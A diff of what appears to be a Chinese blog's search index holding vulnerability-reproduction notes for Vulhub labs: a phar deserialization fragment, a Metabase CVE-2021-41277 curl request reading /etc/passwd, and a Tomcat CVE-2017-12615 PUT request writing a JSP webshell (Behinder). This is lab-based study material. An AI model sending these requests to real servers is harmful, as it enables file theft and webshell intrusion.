+<p><img src="/images/image-20230910204850323.png" alt="image-20230910204850323"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用了file_get_contents()去读取了一个可控的路径参数，所以这里可以通过phar://协议去触发phar反序列化</p>
 <p>既然路径可控，那么首先想到的就是log文件，虽然log不能直接被当做php执行，但是有了file_get_contents+phar就可以；我们修改可控的viewfile参数后看看log中是什么样的</p>
 <p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/ez9hcsiijj.png" alt="img"></p>
@@ -1226,21 +1239,22 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Metabase任意文件读取漏洞（CVE-2021-41277）</title>
     <url>/2023/02/11/Metabase%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41277%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="Metabase任意文件读取漏洞（CVE-2021-41277）"><a href="#Metabase任意文件读取漏洞（CVE-2021-41277）" class="headerlink" title="Metabase任意文件读取漏洞（CVE-2021-41277）"></a>Metabase任意文件读取漏洞（CVE-2021-41277）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Metabase是一个开源的数据分析平台。在其<strong>0.40.0到0.40.4版本</strong>中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Metabase是一个开源的数据分析平台。在其<strong>0.40.0到0.40.4版本</strong>中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</p>
 <p>参考链接：</p>
 <ul>
 <li><a href="https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr" target="_blank" rel="noopener">https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr</a></li>
 <li><a href="https://github.com/tahtaciburak/CVE-2021-41277" target="_blank" rel="noopener">https://github.com/tahtaciburak/CVE-2021-41277</a></li>
 </ul>
+<a id="more"></a>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">metabase 0.40.0-0.40.4</span><br></pre></td></tr></table></figure>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个Metabase 0.40.4版本服务器：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 <p>服务启动后，访问<code>http://your-ip:3000</code>可以查看到Metabase的安装引导页面，我们填写初始账号密码（自己设置），并且跳过后续的数据库填写的步骤即可完成安装：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215922566.png" alt="image-20230910215922566"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215943458.png" alt="image-20230910215943458"></p>
+<p><img src="/images/image-20230910215922566.png" alt="image-20230910215922566"></p>
+<p><img src="/images/image-20230910215943458.png" alt="image-20230910215943458"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>执行以下命令读取<code>/etc/passwd</code>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910220202228.png" alt="image-20230910220202228"></p>
+<p><img src="/images/image-20230910220202228.png" alt="image-20230910220202228"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1252,9 +1266,10 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</title>
     <url>/2022/10/18/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><p>Tomcat版本：8.5.19</p>
+    <content><![CDATA[<p>Tomcat版本：8.5.19</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/tomcat/CVE-2017-12615/</span><br><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 <p>运行完成后访问<code>http://your-ip:8080</code>即可看到Tomcat的Example页面。</p>
+<a id="more"></a>
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>参考：</p>
 <ul>
 <li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html</a></li>
@@ -1267,10 +1282,10 @@ for i in range(0,30):#密码猜测
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接连接到docker开启的tomcat环境，文件直接上传到docker里面的那个tomcat中</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接发送以下数据包即可在Web根目录写入shell：</span><br><span class="line"></span><br><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
 <p>PUT方法向Tomcat中上传冰蝎马</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230919094810254.png" alt="image-20230919094810254"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230919094820779.png" alt="image-20230919094820779"></p>
+<p><img src="/images/image-20230919094810254.png" alt="image-20230919094810254"></p>
+<p><img src="/images/image-20230919094820779.png" alt="image-20230919094820779"></p>
 <p>冰蝎连接</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230919133124835.png" alt="image-20230919133124835"></p>
+<p><img src="/images/image-20230919133124835.png" alt="image-20230919133124835"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
